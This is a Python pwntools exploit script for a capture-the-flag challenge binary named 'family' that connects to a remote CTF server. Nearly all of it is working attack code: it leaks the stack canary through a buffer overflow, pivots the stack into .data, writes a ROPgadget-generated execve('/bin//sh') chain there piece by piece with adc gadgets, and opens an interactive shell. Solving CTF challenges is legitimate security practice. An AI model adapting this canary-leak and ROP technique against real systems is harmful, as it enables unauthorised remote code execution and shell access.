#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
from struct import pack

pwn_file = "./family"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
# context.log_level = 'debug'

c = process(pwn_file)
dbg_script = """
#set follow-fork-mode child
# b *0x400c7d
c
"""
# gdb.attach(c,dbg_script)
c = remote('ctf.adl.tw', '11006')
c.sendafter('\n', b'a' * (0x30 - 0x18) + b'x')
print(c.recvn(0x18 + 1))
canary =  u64(b'\0' + c.recvn(8 - 1))
#c.recvuntil('\n')
print(hex(canary))
rbp = 0x00000000006bd000 - 0x400 # .data .bss?

# read again
p = b''
#p += p64(0x000000000044a365) # pop rdx ; ret
#p += p64(rbp)
#p += p64(0x000000000044447c) # lea rax, [rdx + 8] ; ret
#p += p64(0x000400c78) # read 0x40
p += p64(0x400bbf)
c.sendafter('\n', b'a' * (0x18) + p64(canary) + p64(rbp) + p)



def rop4(rops, last=p64(0x400bbf), new_rbp = rbp):
    assert(len(rops) <= 4)
    c.sendafter('QQ\n', b'AAAAAA')
    p = b''
    for gadget in rops:
        p += gadget
    p += last 
    c.sendafter('?\n', b'a' * (0x18) + p64(canary) + p64(new_rbp) + p)

def adc_memory(addr, value):
    rop4([
        p64(0x000000000044c929), # pop rdx ; pop rsi ; ret
        value,
        p64(addr + 1),
        p64(0x00000000004473bd)# adc qword ptr [rsi - 1], rdx ; ret
        ])

#execve generated by ROPgadget
# Padding goes here
p = b''
p += p64(0x0000000000410713) # pop rsi ; ret
p += p64(rbp - 0x20) # @ .data
p += p64(0x000000000044a30c) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000410713) # pop rsi ; ret
p += p64(rbp - 0x20 + 8) # @ .data + 8
p += p64(0x00000000004452b0) # xor rax, rax ; ret
p += p64(0x00000000004801d1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000400696) # pop rdi ; ret
p += p64(rbp - 0x20) # @ .data
p += p64(0x0000000000410713) # pop rsi ; ret
p += p64(rbp - 0x20 + 8) # @ .data + 8
p += p64(0x000000000044a365) # pop rdx ; ret
p += p64(rbp - 0x20 + 8) # @ .data + 8
p += p64(0x00000000004452b0) # xor rax, rax ; ret
p += p64(0x000000000044a30c) # pop rax ; ret
p += p64(59) # data
p += p64(0x000000000040132c) # syscall

# write to data
for i in range(0, len(p), 8):
    print(hex(rbp))
    adc_memory(rbp + i, p[i: i + 8])
    print(i)


leave = 0x0000000000400cbb # leave ; ret
#input()
rop4([], p64(leave), rbp - 8)

c.interactive()
c.close()

